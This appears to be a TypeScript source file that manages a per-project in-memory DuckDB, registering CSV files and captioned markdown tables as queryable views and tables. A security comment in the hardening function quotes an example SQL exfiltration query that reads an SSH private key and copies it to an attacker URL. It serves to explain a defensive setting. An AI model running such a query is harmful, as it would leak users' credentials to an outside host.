import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import crypto from 'node:crypto';
import YAML from 'yaml';
import { DuckDBInstance, type DuckDBConnection } from '@duckdb/node-api';
import { indexCsvTable, unindexCsvTable, unindexAllCsvTables, type CsvTableColumn } from '../graph/index';
import { parseMarkdown, type ParsedTable } from '../graph/parser';
import { slugifyTableName } from '../../shared/table-name';
import { serializeCsv } from '../../shared/csv-parse';
import type { ProjectContext } from '../project-context-types';
import { createProjectStore } from '../project-store';
import { loadCsvSchema, buildReadCsvSql } from './csv-schema';

interface TablesState {
  rootPath: string;
  instance: DuckDBInstance;
  connection: DuckDBConnection;
  /** relativePath → tableName for the currently-registered CSV views. */
  pathToTable: Map<string, string>;
  /** tableName → relativePath, so we can detect + warn on collisions. */
  tableToPath: Map<string, string>;
  /**
   * notePath → the captioned markdown tables registered from that note (#1357).
   * A note can hold several captioned tables; `tableIndex` is the position in
   * the note's full `parsed.tables` list (captioned or not), matching the
   * graph's positional `…/table/<index>` addressing.
   */
  noteTables: Map<string, { name: string; tableIndex: number }[]>;
  /**
   * tableName → notePath. Shares the identifier namespace with `tableToPath`
   * so a markdown table can't collide with a CSV (or another note table).
   */
  tableToNote: Map<string, string>;
}

// Dispose closes the in-memory DuckDB (connection then instance) before the
// state is dropped. closeSync is synchronous, so `disposeProject` stays sync.
const store = createProjectStore<TablesState>({
  dispose: (state) => {
    try { state.connection.closeSync(); } catch { /* already closed */ }
    try { state.instance.closeSync(); } catch { /* already closed */ }
  },
});

function getState(ctx: ProjectContext): TablesState | null {
  return store.get(ctx);
}

export type QueryResult =
  | { ok: true; columns: string[]; rows: Record<string, unknown>[] }
  | { ok: false; error: string };

export interface TableInfo {
  name: string;
  relativePath: string;
  columns: string[];
  rowCount: number;
}

/** Open an in-memory DuckDB for the given project. Idempotent per project. */
export async function initTablesDb(ctx: ProjectContext): Promise<void> {
  if (store.has(ctx)) return;
  const instance = await DuckDBInstance.create(':memory:');
  const connection = await instance.connect();
  await hardenConnection(connection);
  store.set(ctx, {
    rootPath: ctx.rootPath,
    instance,
    connection,
    pathToTable: new Map(),
    tableToPath: new Map(),
    noteTables: new Map(),
    tableToNote: new Map(),
  });
}

/**
 * Lock down a fresh DuckDB connection before any query runs (#1325).
 *
 * The same connection backs the Query Panel AND note-embedded ```sql
 * compute cells, so an untrusted thoughtbase's cell can run arbitrary
 * SQL here. DuckDB's `httpfs` extension autoloads on first use of an
 * `https://`/`s3://` path, which turns a query into a network
 * exfiltration primitive (`COPY (SELECT … FROM read_text('~/.ssh/id_rsa'))
 * TO 'https://attacker/…'`). Disabling extension autoinstall/autoload
 * removes that egress path entirely while leaving the core built-ins the
 * CSV pipeline relies on (`read_csv_auto`, `read_csv`) fully functional —
 * they need no extension.
 *
 * Local file *read* via core built-ins (`read_text`, `read_csv_auto` of an
 * arbitrary path) is a core capability we can't drop without breaking CSV
 * views; that residual is covered by the per-project compute trust gate
 * (`renderer/lib/compute/run-cell-with-trust.ts`). This is the network
 * half of the defense-in-depth pair.
 */
async function hardenConnection(connection: DuckDBConnection): Promise<void> {
  await connection.run(
    'SET autoinstall_known_extensions=false; SET autoload_known_extensions=false;',
  );
}

export function disposeProject(ctx: ProjectContext): void {
  // The DuckDB close runs synchronously inside the store's dispose hook, so
  // this stays a sync teardown even though `dispose` returns a promise.
  void store.dispose(ctx);
}

/**
 * Execute `sql` and return rows as plain JS objects suitable for structured
 * clone across the IPC boundary. Malformed SQL or runtime errors come back
 * as `{ ok: false, error }` — never thrown.
 */
export async function runQuery(ctx: ProjectContext, sql: string): Promise<QueryResult> {
  const state = getState(ctx);
  if (!state) return { ok: false, error: 'Tables DB is not initialized' };
  try {
    const reader = await state.connection.runAndReadAll(sql);
    const columns = reader.columnNames();
    const rows = reader.getRowObjectsJS() as Record<string, unknown>[];
    return { ok: true, columns, rows };
  } catch (err) {
    return { ok: false, error: err instanceof Error ? err.message : String(err) };
  }
}

// ── CSV pipeline (#233) ─────────────────────────────────────────────────────

/**
 * Derive a DuckDB-safe table name from a CSV's relative path.
 * `notes/data/2024-experiment.csv` → `notes_data_2024_experiment`.
 * Identifiers that would start with a digit get a `t_` prefix.
 */
export function deriveTableName(relativePath: string): string {
  // Strip the CSV extension, then apply the shared identifier sanitizer so the
  // CSV and markdown-table (#1356) paths agree on names + collide in one namespace.
  return slugifyTableName(relativePath.replace(/\.csv$/i, ''));
}

/**
 * Read a companion markdown note alongside the CSV (same dir, matching stem).
 * If the frontmatter declares `table_name:`, return it as the SQL identifier.
 * Returns null if no companion exists, no frontmatter, or no override.
 */
async function readCompanionOverride(rootPath: string, relativePath: string): Promise<string | null> {
  const dir = path.dirname(relativePath);
  const stem = path.basename(relativePath, path.extname(relativePath));
  const companionRel = dir === '.' ? `${stem}.md` : `${dir}/${stem}.md`;
  const companionAbs = path.join(rootPath, companionRel);
  let content: string;
  try {
    content = await fs.readFile(companionAbs, 'utf-8');
  } catch {
    return null;
  }
  const m = content.match(/^---\n([\s\S]*?)\n---/);
  if (!m) return null;
  try {
    const fm = YAML.parse(m[1]!) as Record<string, unknown> | null;
    const raw = fm?.table_name;
    if (typeof raw === 'string' && raw.trim().length > 0) {
      // Run the user-supplied override through the same sanitizer so a
      // whitespace-happy YAML value can't produce an invalid identifier.
      return deriveTableName(raw);
    }
  } catch {
    /* malformed YAML — ignore, fall back to the derived name */
  }
  return null;
}

/**
 * Information surfaced when two CSVs derive the same table name and
 * the second is skipped (#354). Callers route this to a renderer
 * toast so the user can fix the conflict via `table_name:` in a
 * companion .md.
 */
export interface CsvTableCollision {
  /** Table name both CSVs derived. */
  tableName: string;
  /** Path that was registered first and won. */
  existingPath: string;
  /** Path that was skipped to avoid the clobber. */
  attemptedPath: string;
}

export type RegisterCsvResult =
  | { ok: true }
  | { ok: false; reason: 'collision'; collision: CsvTableCollision }
  | { ok: false; reason: 'inactive' }
  | { ok: false; reason: 'error'; error: unknown };

export type RegisterTableResult =
  | { ok: true; name: string }
  | { ok: false; reason: 'collision'; collision: CsvTableCollision }
  | { ok: false; reason: 'inactive' }
  | { ok: false; reason: 'uncaptioned' }
  | { ok: false; reason: 'error'; error: unknown };

/**
 * Per-project collision-listener registry (#354). Listeners are
 * attached by window-manager so each window sees collisions for its
 * own project, including those produced during the init-time
 * `registerAllCsvs` sweep (when the window-manager isn't yet calling
 * registerCsv itself).
 */
type CollisionListener = (c: CsvTableCollision) => void;
const collisionListeners = new Map<string, Set<CollisionListener>>();

export function onCsvTableCollision(rootPath: string, listener: CollisionListener): () => void {
  let set = collisionListeners.get(rootPath);
  if (!set) { set = new Set(); collisionListeners.set(rootPath, set); }
  set.add(listener);
  return () => {
    const s = collisionListeners.get(rootPath);
    if (!s) return;
    s.delete(listener);
    if (s.size === 0) collisionListeners.delete(rootPath);
  };
}

function emitCollision(rootPath: string, c: CsvTableCollision): void {
  const set = collisionListeners.get(rootPath);
  if (!set) return;
  for (const fn of set) {
    try { fn(c); } catch (err) { console.error('[tables] collision listener threw:', err); }
  }
}

/**
 * Register (or re-register) a CSV file as a DuckDB view. The view is lazy —
 * DuckDB re-reads the file on every query — so content changes don't require
 * re-registration. Re-register is called when the file is added or when the
 * companion note's `table_name:` may have changed.
 *
 * Returns a result indicating outcome. Callers that own a renderer
 * window should surface `collision` results as a toast — the
 * console.warn alone wasn't visible to users (#354).
 */
export async function registerCsv(ctx: ProjectContext, relativePath: string): Promise<RegisterCsvResult> {
  const state = getState(ctx);
  if (!state) return { ok: false, reason: 'inactive' };
  const { rootPath, connection, pathToTable, tableToPath } = state;
  const override = await readCompanionOverride(rootPath, relativePath);
  const tableName = override ?? deriveTableName(relativePath);

  // If another path already claimed this table name, warn and skip rather
  // than silently clobbering whichever one loaded first.
  const existingPath = tableToPath.get(tableName);
  if (existingPath && existingPath !== relativePath) {
    console.warn(
      `[tables] Table name collision: '${tableName}' would be used by both ` +
      `'${existingPath}' and '${relativePath}'. Skipping the second. Use ` +
      `'table_name:' in a companion .md to disambiguate.`,
    );
    const collision = { tableName, existingPath, attemptedPath: relativePath };
    emitCollision(rootPath, collision);
    return { ok: false, reason: 'collision', collision };
  }

  // If this path was previously registered under a different name (e.g. the
  // companion override was just added or changed), drop the old view first.
  const previousName = pathToTable.get(relativePath);
  if (previousName && previousName !== tableName) {
    try {
      await connection.run(`DROP VIEW IF EXISTS "${previousName}"`);
    } catch { /* tolerate the rare rename race */ }
    tableToPath.delete(previousName);
    unindexCsvTable(ctx, previousName);
  }

  const absPath = path.join(rootPath, relativePath);
  // Look for an explicit schema declaration (#237). When present, we
  // call `read_csv(…, columns={…})` so the user's pinned types win
  // over DuckDB's auto-inference. When absent, fall back to
  // `read_csv_auto(…)` — schema-less CSVs are still loaded the
  // same way they always were.
  const schema = await loadCsvSchema(rootPath, relativePath);
  const escapedPath = absPath.replace(/'/g, "''");
  const readExpr = schema
    ? buildReadCsvSql(absPath, schema)
    : `read_csv_auto('${escapedPath}')`;
  try {
    await connection.run(
      `CREATE OR REPLACE VIEW "${tableName}" AS SELECT * FROM ${readExpr}`,
    );
    pathToTable.set(relativePath, tableName);
    tableToPath.set(tableName, relativePath);
    // Reflect the shape into the knowledge graph (CSVW + OWL). This
    // lets SPARQL consumers ask "what tables do I have?", "what columns
    // does X expose?", and reason about column datatypes.
    await indexCsvTableShape(ctx, relativePath, tableName);
    return { ok: true };
  } catch (err) {
    console.warn(
      `[tables] Failed to register '${relativePath}' as '${tableName}': ` +
      (err instanceof Error ? err.message : String(err)),
    );
    return { ok: false, reason: 'error', error: err };
  }
}

/**
 * Fetch column names + DuckDB types from information_schema and write
 * the corresponding CSVW/OWL triples to the graph. Failures here log but
 * don't throw — the CSV is still queryable via SQL even if the graph
 * entry didn't land.
 */
async function indexCsvTableShape(ctx: ProjectContext, relativePath: string, tableName: string): Promise<void> {
  const state = getState(ctx);
  if (!state) return;
  const safeName = tableName.replace(/'/g, "''");
  try {
    const reader = await state.connection.runAndReadAll(
      `SELECT column_name, data_type, ordinal_position ` +
      `FROM information_schema.columns ` +
      `WHERE table_name = '${safeName}' AND table_schema = 'main' ` +
      `ORDER BY ordinal_position`,
    );
    const rows = reader.getRowObjectsJS() as Record<string, unknown>[];
    const columns: CsvTableColumn[] = rows.map((r) => ({
      name: String(r.column_name),
      duckdbType: String(r.data_type),
      // ordinal_position is 1-based in DuckDB; we publish 0-based.
      index: Number(r.ordinal_position) - 1,
    }));
    indexCsvTable(ctx, { tableName, relativePath, columns });
  } catch (err) {
    console.warn(
      `[tables] Failed to index '${tableName}' into graph: ` +
      (err instanceof Error ? err.message : String(err)),
    );
  }
}

/** Drop the view for a CSV path. No-op if the path was never registered. */
export async function unregisterCsv(ctx: ProjectContext, relativePath: string): Promise<void> {
  const state = getState(ctx);
  if (!state) return;
  const { connection, pathToTable, tableToPath } = state;
  const tableName = pathToTable.get(relativePath);
  if (!tableName) return;
  try {
    await connection.run(`DROP VIEW IF EXISTS "${tableName}"`);
  } catch { /* view may already be gone */ }
  pathToTable.delete(relativePath);
  tableToPath.delete(tableName);
  unindexCsvTable(ctx, tableName);
}

// ── Markdown tables (#1357) ─────────────────────────────────────────────────

/**
 * Materialize a captioned markdown table into the shared DuckDB as a real
 * TABLE (not a VIEW — an embedded table has no backing file to `read_csv`
 * lazily). The rows are serialized to CSV text and loaded through DuckDB's
 * CSV sniffer so **type inference matches the standalone-`.csv` path** (a
 * numeric column comes back numeric).
 *
 * Opt-in: only tables carrying a `name` (from a `Table: <caption>` line, #1356)
 * are registered; uncaptioned tables stay graph-only and return `uncaptioned`.
 *
 * Names share one identifier namespace with CSV tables and other note tables,
 * so a clash is skipped + surfaced via the same collision toast (#354). CSV
 * tables win — callers register all CSVs before note tables (see #1358).
 *
 * Precondition: the caller has already dropped this note's prior tables (via
 * `unregisterNoteTables`) — `reregisterNoteTables` does this. A lingering
 * entry for `notePath` therefore means a sibling table in the same note
 * already claimed the name (two identical captions), which is also skipped.
 */
export async function registerMarkdownTable(
  ctx: ProjectContext,
  notePath: string,
  table: ParsedTable,
  tableIndex: number,
): Promise<RegisterTableResult> {
  const state = getState(ctx);
  if (!state) return { ok: false, reason: 'inactive' };
  const { rootPath, connection, tableToPath, tableToNote, noteTables } = state;
  const tableName = table.name;
  if (!tableName) return { ok: false, reason: 'uncaptioned' };

  const existingPath = tableToPath.get(tableName) ?? tableToNote.get(tableName);
  if (existingPath) {
    console.warn(
      `[tables] Table name collision: '${tableName}' from note '${notePath}' ` +
      `is already used by '${existingPath}'. Skipping the markdown table. ` +
      `Rename the 'Table:' caption to disambiguate.`,
    );
    const collision = { tableName, existingPath, attemptedPath: notePath };
    // A same-note duplicate (both paths identical) is a user typo, not a
    // cross-source clash — skip it quietly rather than firing a confusing toast.
    if (existingPath !== notePath) emitCollision(rootPath, collision);
    return { ok: false, reason: 'collision', collision };
  }

  // Round-trip the cells through a temp CSV so DuckDB's sniffer types them.
  const csvText = serializeCsv(table.headers, table.rows);
  const tmpPath = path.join(os.tmpdir(), `minerva-mdtable-${crypto.randomUUID()}.csv`);
  try {
    await fs.writeFile(tmpPath, csvText, 'utf-8');
    const escaped = tmpPath.replace(/'/g, "''");
    // header=true: we always emit a header row, so don't leave it to sniffing.
    // null_padding=true: tolerate short rows in a hand-written markdown table.
    await connection.run(
      `CREATE OR REPLACE TABLE "${tableName}" AS SELECT * FROM ` +
      `read_csv_auto('${escaped}', header=true, null_padding=true)`,
    );
    const entries = noteTables.get(notePath) ?? [];
    entries.push({ name: tableName, tableIndex });
    noteTables.set(notePath, entries);
    tableToNote.set(tableName, notePath);
    return { ok: true, name: tableName };
  } catch (err) {
    console.warn(
      `[tables] Failed to register markdown table '${tableName}' from ` +
      `'${notePath}': ` + (err instanceof Error ? err.message : String(err)),
    );
    return { ok: false, reason: 'error', error: err };
  } finally {
    await fs.rm(tmpPath, { force: true }).catch(() => { /* best-effort cleanup */ });
  }
}

/** Drop every DuckDB table registered from a note. No-op if none were. */
export async function unregisterNoteTables(ctx: ProjectContext, notePath: string): Promise<void> {
  const state = getState(ctx);
  if (!state) return;
  const { connection, noteTables, tableToNote } = state;
  const entries = noteTables.get(notePath);
  if (!entries) return;
  for (const { name } of entries) {
    try {
      await connection.run(`DROP TABLE IF EXISTS "${name}"`);
    } catch { /* table may already be gone */ }
    tableToNote.delete(name);
  }
  noteTables.delete(notePath);
}

/**
 * Re-parse a note and re-register its captioned tables: drop the note's prior
 * tables, then register each captioned one afresh. This is the entry the file
 * watcher + boot sweep call (#1358); a note edit can add/remove/rename a
 * caption or change rows, so a full drop-then-register keeps DuckDB in sync.
 */
export async function reregisterNoteTables(
  ctx: ProjectContext,
  notePath: string,
  content: string,
): Promise<{ count: number; collisions: CsvTableCollision[] }> {
  const state = getState(ctx);
  if (!state) return { count: 0, collisions: [] };
  await unregisterNoteTables(ctx, notePath);
  const parsed = parseMarkdown(content);
  let count = 0;
  const collisions: CsvTableCollision[] = [];
  for (let i = 0; i < parsed.tables.length; i++) {
    const table = parsed.tables[i]!;
    if (!table.name) continue; // uncaptioned → graph-only, skip SQL registration
    const result = await registerMarkdownTable(ctx, notePath, table, i);
    if (result.ok) count++;
    else if (result.reason === 'collision') collisions.push(result.collision);
  }
  return { count, collisions };
}

/**
 * Scan the thoughtbase on project open and register every `.csv` file under
 * the root. Mirrors graph.indexAllNotes's walker shape.
 *
 * Returns the count of successfully-registered CSVs plus any
 * collisions encountered. Callers route collisions to a renderer
 * toast (#354).
 */
export async function registerAllCsvs(ctx: ProjectContext): Promise<{ count: number; collisions: CsvTableCollision[] }> {
  const state = getState(ctx);
  if (!state) return { count: 0, collisions: [] };
  const { rootPath } = state;
  // Wipe stale CSV-table triples up front so CSVs deleted while the app
  // was closed don't linger in the graph after a full rescan. Each
  // registered CSV writes its own triples as it goes.
  unindexAllCsvTables(ctx);
  let count = 0;
  const collisions: CsvTableCollision[] = [];
  async function walk(dirPath: string) {
    let entries: import('node:fs').Dirent[];
    try {
      entries = await fs.readdir(dirPath, { withFileTypes: true });
    } catch {
      return;
    }
    for (const entry of entries) {
      if (entry.name.startsWith('.') || entry.name === 'node_modules') continue;
      const fullPath = path.join(dirPath, entry.name);
      if (entry.isDirectory()) {
        await walk(fullPath);
      } else if (entry.isFile() && entry.name.toLowerCase().endsWith('.csv')) {
        const rel = path.relative(rootPath, fullPath);
        const result = await registerCsv(ctx, rel);
        if (result.ok) count++;
        else if (result.reason === 'collision') collisions.push(result.collision);
      }
    }
  }
  await walk(rootPath);
  return { count, collisions };
}

/** Every registered CSV's table name, relative path, column names, and row count. */
export async function listTables(ctx: ProjectContext): Promise<TableInfo[]> {
  const state = getState(ctx);
  if (!state) return [];
  const out: TableInfo[] = [];
  for (const [relativePath, name] of state.pathToTable.entries()) {
    const quoted = `"${name}"`;
    const countR = await runQuery(ctx, `SELECT COUNT(*) AS n FROM ${quoted}`);
    const colsR = await runQuery(ctx,
      `SELECT column_name FROM information_schema.columns ` +
      `WHERE table_name = '${name.replace(/'/g, "''")}' AND table_schema = 'main' ` +
      `ORDER BY ordinal_position`,
    );
    const rowCount = countR.ok ? Number(countR.rows[0]?.n ?? 0) : 0;
    const columns = colsR.ok ? colsR.rows.map((r) => String(r.column_name)) : [];
    out.push({ name, relativePath, columns, rowCount });
  }
  out.sort((a, b) => a.relativePath.localeCompare(b.relativePath));
  return out;
}

/** Exposed for tests. */
export function _isOpen(ctx: ProjectContext): boolean {
  return store.has(ctx);
}
